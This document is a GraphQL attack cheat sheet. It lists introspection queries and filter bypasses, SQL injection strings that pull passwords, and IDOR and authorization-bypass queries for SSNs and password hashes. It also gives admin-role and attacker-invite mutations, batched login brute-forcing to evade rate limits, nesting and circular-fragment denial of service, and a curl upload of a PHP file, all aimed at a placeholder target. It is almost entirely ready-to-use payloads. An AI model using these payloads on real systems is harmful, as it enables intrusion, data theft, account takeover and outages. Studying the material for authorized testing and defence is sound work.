# GraphQL Attacks

## Introspection

**First step for any GraphQL endpoint.**

```graphql
# Full schema introspection
{__schema{types{name,fields{name,args{name,type{name}}},description}}}

# Compact query
{__schema{queryType{name},mutationType{name},types{name,fields{name}}}}

# List all types
{__schema{types{name,kind}}}

# Detailed type info
{__type(name:"User"){fields{name,type{name,kind}}}}
```

### Bypassing Introspection Restrictions

```graphql
# Add special characters after __schema
{__schema%0a{types{name}}}

# Use newlines, tabs, commas (ignored by GraphQL, may bypass regex)
{
  __schema {
    types {
      name
    }
  }
}

# Try 'schema' instead of '__schema' (some implementations accept both)
```

### Tools

```bash
# GQLSpection — extract schema and generate queries
gqlspection --url https://target.com/graphql

# graphw00f — fingerprint GraphQL engine
graphw00f -t https://target.com/graphql

# graphql-cop — security audit
graphql-cop -t https://target.com/graphql
```

## SQL Injection via GraphQL

```graphql
# Injection in query arguments
{user(id: "1' OR '1'='1"){ name, email }}

# In variables
{"query": "query($id: String!) { user(id: $id) { name } }",
 "variables": {"id": "1' UNION SELECT password FROM users--"}}

# In filter/search parameters
{users(filter: {name_contains: "' OR 1=1--"}) { name, password }}
```

## Authorization Bypass

```graphql
# Access fields not intended for your role
{user(id: "other-user-id") { name, email, ssn, creditCard }}

# Access admin mutations
mutation { setUserRole(userId: "1", role: ADMIN) { success } }

# Nested object access (IDOR through relationships)
{user(id: "my-id") { orders { user { name, email, password_hash } } }}
```

## Batching Attacks

### Brute-Force via Batching

```graphql
# Send multiple queries in one request to bypass rate limiting
[
  {"query": "{ login(user:\"admin\", pass:\"password1\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"password2\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"password3\") { token } }"}
]
```

### Alias-Based Batching

```graphql
{
  a: login(user: "admin", pass: "pass1") { token }
  b: login(user: "admin", pass: "pass2") { token }
  c: login(user: "admin", pass: "pass3") { token }
}
```

```bash
# CrackQL — GraphQL brute-force tool
crackql -t https://target.com/graphql -q login.graphql -i passwords.csv
```

## Denial of Service

### Deep Nesting (Query Depth Attack)

```graphql
{user{friends{friends{friends{friends{friends{name}}}}}}}
```

### Field Duplication

```graphql
{user{name name name name name name name name name name}}
```

### Circular Fragments

```graphql
fragment A on User { friends { ...B } }
fragment B on User { friends { ...A } }
{user{...A}}
```

## Information Disclosure

```graphql
# Field suggestions in error messages
{user{passwor}}
# Error: "Did you mean 'password'?"

# Debug mode may expose stack traces, SQL queries, internal paths
# Check for __typename in responses for type information
```

## Mutations

```graphql
# List available mutations via introspection
{__schema{mutationType{fields{name,args{name,type{name}}}}}}

# Common dangerous mutations
mutation { deleteUser(id: "1") { success } }
mutation { updateUser(id: "1", role: "admin") { success } }
mutation { createInvite(email: "attacker@evil.com", role: "admin") { code } }
```

## Subscription Abuse

```graphql
# WebSocket-based subscriptions may bypass authentication
subscription { newMessage { content, author { name, email } } }
```

## File Upload (multipart)

GraphQL file uploads follow the GraphQL multipart request spec:

```bash
curl -X POST https://target.com/graphql \
  -F operations='{"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
  -F map='{"0":["variables.file"]}' \
  -F 0=@malicious.php
```
